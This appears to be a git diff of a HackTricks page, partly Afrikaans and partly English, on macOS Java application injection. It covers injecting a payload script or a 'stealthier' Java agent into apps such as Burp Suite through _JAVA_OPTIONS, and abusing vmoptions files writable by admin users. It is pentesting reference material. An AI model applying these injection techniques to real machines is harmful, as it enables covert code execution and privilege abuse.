@@ -1,22 +1,23 @@
-# macOS Java Toepassingsinspuiting
+# macOS Java Applications Injection
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Opname
+## Enumeration
 
-Vind Java-toepassings wat op jou stelsel geïnstalleer is. Daar is opgemerk dat Java-toepassings in die **Info.plist** sekere Java-parameters bevat wat die string **`java.`** bevat, so jy kan daarna soek:
+Vind Java-toepassings wat op jou stelsel geïnstalleer is. Dit is opgemerk dat Java-toepassings in die **Info.plist** sekere java parameters sal bevat wat die string **`java.`** bevat, so jy kan daarna soek:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -26,13 +27,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA\_OPTIONS
 
-Die omgewingsveranderlike **`_JAVA_OPTIONS`** kan gebruik word om willekeurige Java parameters in te spuit tydens die uitvoering van 'n Java-gekompileerde app:
+Die omgewing veranderlike **`_JAVA_OPTIONS`** kan gebruik word om arbitrêre java parameters in die uitvoering van 'n java gecompileerde toepassing in te spuit:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Om dit as 'n nuwe proses uit te voer en nie as 'n kind van die huidige terminaal nie, kan jy die volgende gebruik:
+Om dit as 'n nuwe proses uit te voer en nie as 'n kind van die huidige terminal nie, kan jy gebruik maak van:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -85,7 +86,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Egter, dit sal 'n fout veroorsaak op die uitgevoerde app, 'n meer heimlike manier is om 'n Java-agent te skep en die volgende te gebruik:
+However, that will trigger an error on the executed app, another more stealth way is to create a java agent and use:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -95,7 +96,7 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 {% hint style="danger" %}
-Die skep van die agent met 'n **verskillende Java-weergawe** as die aansoek kan die uitvoering van beide die agent en die aansoek laat crasht
+Die skep van die agent met 'n **ander Java weergawe** as die toepassing kan die uitvoering van beide die agent en die toepassing laat crash
 {% endhint %}
 
 Waar die agent kan wees:
@@ -119,7 +120,7 @@ err.printStackTrace();
 ```
 {% endcode %}
 
-Om die agent te kompileer, voer die volgende uit:
+Om die agent te kompileer, voer uit:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -131,7 +132,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-En voer dan die omgewingsveranderlike uit en hardloop die Java-toepassing soos volg:
+En dan voer die omgewing veranderlike uit en hardloop die java-toepassing soos:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -142,12 +143,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## vmoptions-lêer
 
-Hierdie lêer ondersteun die spesifikasie van **Java-parameters** wanneer Java uitgevoer word. Jy kan van die vorige truuks gebruik maak om die Java-parameters te verander en die proses **willekeurige opdragte te laat uitvoer**.\
-Verder kan hierdie lêer ook **ander lêers insluit** met die `include`-opdrag, sodat jy ook 'n ingeslote lêer kan verander.
+Hierdie lêer ondersteun die spesifikasie van **Java params** wanneer Java uitgevoer word. Jy kan sommige van die vorige truuks gebruik om die java params te verander en **die proses in staat te stel om arbitrêre opdragte uit te voer**.\
+Boonop kan hierdie lêer ook **ander insluit** met die `include` gids, so jy kan ook 'n ingeslote lêer verander.
 
-Selfs meer, sommige Java-programme sal **meer as een `vmoptions`-lêer laai**.
+Nog meer, sommige Java-apps sal **meer as een `vmoptions`** lêer laai.
 
-Sommige programme soos Android Studio dui in hul **uitset aan waar hulle na hierdie lêers kyk**, byvoorbeeld:
+Sommige toepassings soos Android Studio dui in hul **uitset aan waar hulle soek** vir hierdie lêers, soos:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -158,7 +159,7 @@ Sommige programme soos Android Studio dui in hul **uitset aan waar hulle na hier
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-As hulle dit nie doen nie, kan jy dit maklik nagaan met:
+As hulle nie, kan jy dit maklik nagaan met:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -166,18 +167,4 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Let op hoe interessant dit is dat Android Studio in hierdie voorbeeld probeer om die lêer **`/Applications/Android Studio.app.vmoptions`** te laai, 'n plek waar enige gebruiker van die **`admin` groep skryftoegang het**.
-
-<details>
-
-<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
-
-</details>
+Let op hoe interessant dit is dat Android Studio in hierdie voorbeeld probeer om die lêer **`/Applications/Android Studio.app.vmoptions`** te laai, 'n plek waar enige gebruiker van die **`admin` groep skryfrek toegang het.**
